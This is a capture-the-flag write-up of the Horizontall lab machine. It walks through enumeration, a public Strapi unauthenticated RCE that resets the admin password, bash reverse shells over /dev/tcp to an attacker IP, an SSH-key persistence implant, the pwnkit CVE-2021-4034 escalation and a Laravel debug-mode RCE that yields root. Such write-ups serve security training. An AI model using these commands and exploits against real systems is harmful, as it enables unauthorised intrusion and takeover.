# Horizontall Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.105 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.105`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It looks like there is an nginx webserver running on port 80 and SSH is open on port 22. Attempting to visit the website redirects us to `http://horizontall.htb`, so let's add that to `/etc/hosts`: `echo "10.10.11.105 horizontall.htb" | sudo tee -a /etc/hosts`.

### Nginx

Running `gobuster` against `http://horizontall.htb` doesn't return any meaningful results: `gobuster dir -u http://horizontall.htb -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`.

After looking at the site source code, we find the following code segment in `app.c68eb462.js` (see an online JavaScript formatter, like [beautifier.io](https://beautifier.io/) to make the code readable):

```javascript
methods: {
    getReviews: function() {
        var t = this;
        r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
            return t.reviews = s.data
        }))
    }
}
```

Let's add this new subdomain to `/etc/hosts`: `echo "10.10.11.105 api-prod.horizontall.htb" | sudo tee -a /etc/hosts`.

Navigating to `http://api-prod.horizontall.htb/` simply says "Welcome" with a page title of "Welcome to your API".

### Wappalyzer

Checking [Wappalyzer](https://www.wappalyzer.com/) shows that this page is using the [Strapi CMS](https://github.com/strapi/strapi), which describes itself as a "Open source Node.js Headless CMS."

Searching for strapi vulnerabilities using `searchsploit` (`searchsploit strapi`) shows some exploits for version `3.0.0-beta`

```
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                             | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)           | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)     | multiple/webapps/50239.py
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Gobuster

Let's try running `gobuster` on the new subdomain we found: `gobuster dir -u http://api-prod.horizontall.htb -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`. This scan finds several available endpoints.

```
/admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60] 
/reviews              (Status: 200) [Size: 507]
/Reviews              (Status: 200) [Size: 507]
/Users                (Status: 403) [Size: 60] 
/Admin                (Status: 200) [Size: 854]
/REVIEWS              (Status: 200) [Size: 507]
/%C0                  (Status: 400) [Size: 69]
```

So, it looks like we have `/admin`, `/reviews`, and `/users` to work with.

* `/users` returns a 403 Forbidden code.
* `admin` redirects us to `/admin/auth/login` and shows a Strapi login page.
* `/reviews` returns some JSON data containing what are presumably reviews for the service this company offers: `[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}]`.

Thus, `/admin` appears to be the most promising.

## Foothold

We found some exploits using `searchsploit` earlier. So, maybe those will be helpful. We can also check [snyk](https://snyk.io), which finds [the same exploits plus a few more](https://snyk.io/vuln/npm:strapi).

Let's take a look at the "Remote Code Execution (RCE) (Unauthenticated)" exploit, since it requires the least access to the system and is a RCE. We can look at the exploit script on the [exploit-db website](https://www.exploit-db.com/exploits/50239) or by copying it to our home directory by running `searchsploit -m 50239.py`.

There is a `check_version` function that checks if the version of Strapi is the one with the vulnerability.

```python
def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")
```

Apparently, the version information is public at the `/admin/init` endpoint. Requesting that endpoint (`curl http://api-prod.horizontall.htb/admin/init`) shows that the version is `3.0.0-beta.17.4`, which is indeed the vulnerable version: `{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}`.

Let's try running the script

```bash
$ python3 50239.py
[-] Wrong number of arguments provided
[*] Usage: python3 exploit.py <URL>
```

Looks like we simply need to specify the URL:

```bash
$ python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0Nzg5MTM3LCJleHAiOjE2NDczODExMzd9.xOmEWy3K2A4eXRI01t4gmgxlmRSjCJI0v34HO9-kWTw

$>
```

Trying to authenticate with the provided credentials on the `/admin/auth/login` page works. However, this exploit also gives us remote code execution. Trying to run `whoami` returns an error though since it is a blind RCE exploit.

```bash
$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```

Maybe a reverse shell will work though. We can use [revshells](https://www.revshells.com/) to generate a bash reverse shell. The reverse shell command is `sh -i >& /dev/tcp/10.10.14.97/59726 0>&1` (you can find your ip using `ip a` and looking under `tun0`) and you can start a listener with netcat by running `nc -lvnp 59726`, but we will use [calebstewart/pwncat](https://github.com/calebstewart/pwncat) instead.

We can start a listener with `pwncat-cs -lp 59726`. Then, execute the reverse shell by running `sh -i >& /dev/tcp/10.10.14.97/59726 0>&1` using the RCE exploit. This doesn't work so we can try surrounding the reverse shell with `bash -c`: `bash -c 'sh -i >& /dev/tcp/10.10.14.97/59726 0>&1'`, which is effective.

## Lateral Movement

We now have access to the `strapi` account over SSH. We `cat /etc/passwd` and see that the `strapi` user's home folder is `/opt/strapi`. There is no `user.txt` here so we check the `developer` (id `1000`) user's home folder, which has the `user.txt` flag. We can view the `user.txt` flag with `cat /home/developer/user.txt`.

We can copy over an SSH key so that we can authenticate as the `strapi` user without having to reuse the exploit by running `run implant.authorized_key key=/home/kali/.ssh/id_rsa` within `pwncat`. Alternatively, the key can be manually copied over to the target machine. Now, we can reconnect with `pwncat-cs strapi@10.10.11.105 --identity /home/kali/.ssh/id_rsa`.

## Privilege Escalation

`pwncat` has some built-in escalation techniques, which we can try with `escalate list -u root`, but none of these work.

Within the `/opt/strapi` directory there is an RSA private and public key called `strapi` and `strapi.pub`, respectively. So, that might be useful.

We use the standard [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script to find potential privilege escalation paths. Pwncat makes it easy to transfer this script to the target with `upload /home/kali/linpeas.sh /opt/strapi/linpeas.sh`. Then, run it with `bash linpeas.sh`.

LinPEAS immediately tells us that the installed version of `sudo` is vulnerable to `CVE-2021-4034`, which is a very recent exploit and is not the intended solution. However, downloading [berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034) as a ZIP file, copying the file over, unzipping it, running `make` in the directory, and then executing `./cve-2021-4034` opens a root shell and the `root.txt` flag can be obtained with `cat /root/root.txt`.

However, LinPEAS also shows that there are open ports on `127.0.0.1`.

```
Active Ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1749/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

`3306` is the default MySQL port so that leaves `1337` and `8000` to be investigated.

Running `curl 127.0.0.1:1337` shows that port `1337` simply contains the Strapi CMS page with the "Welcome" message. Running `curl 127.0.0.1:8000` shows that port `8000` contains an application using the Laravel framework.

We can forward this port to our attack machine by running `ssh -i /home/kali/.ssh/id_rsa -L 8000:localhost:8000 strapi@horizontall.htb`. Now, navigating to `localhost:8000` on the attack machine will render the webpage.

Let's try bruteforcing directories with `gobuster dir -u http://localhost:8000 -t 100 -w /usr/share/wordlists/dirb/common.txt`.

```
/.htaccess            (Status: 200) [Size: 603]
/favicon.ico          (Status: 200) [Size: 0]  
/index.php            (Status: 200) [Size: 17473]
/profiles             (Status: 500) [Size: 616206]
/robots.txt           (Status: 200) [Size: 24]
```

The `/profiles` endpoint looks interesting since it is large. We find a Laravel debug page, which means that Laravel is in debug mode. If we click "Context" we see that version `8.43.0` of Laravel is being used.

Let's see if there are any vulnerabilities for this. Using `searchsploit laravel` we find "8.4.2 debug mode - Remote code execution," which we can copy to our home directory with `searchsploit -m 49424.py`. Alternatively, one of these scripts can be used: [zhzyker/CVE-2021-3129](https://github.com/zhzyker/CVE-2021-3129) or [nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit).

According to the script, we need the path to the laravel log file, which we can figure out by looking at the debug mode page. The page says "Undefined variable: informat (View: /home/developer/myproject/resources/views/profile/index.blade.php)", which gives us the path to the laravel framework: `/home/developer/myproject/`. [Searching online for the log location](https://laravel.com/docs/4.2/errors#logging) reveals they are stored in `app/storage/logs/laravel.log`. Therefore, the log path is `/home/developer/myproject/storage/logs/laravel.log`.

Running `python3 49424.py http://localhost:8000 /home/developer/myproject/storage/logs/laravel.log 'id'` displays `uid=0(root) gid=0(root) groups=0(root)`, which means our command is executed as root. Let's use a reverse shell as a payload and open a listener on our attacker machine: `python3 49424.py http://localhost:8000 /home/developer/myproject/storage/logs/laravel.log 'bash -c "sh -i >& /dev/tcp/10.10.14.97/35965 0>&1"'"` and `pwncat-cs -lp 35965`. After waiting a few seconds we get a root reverse shell.

We can get the `root.txt` flag with `cat /root/root.txt`. We can gain persistance as `root` with `pwncat` by running `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in the local shell.
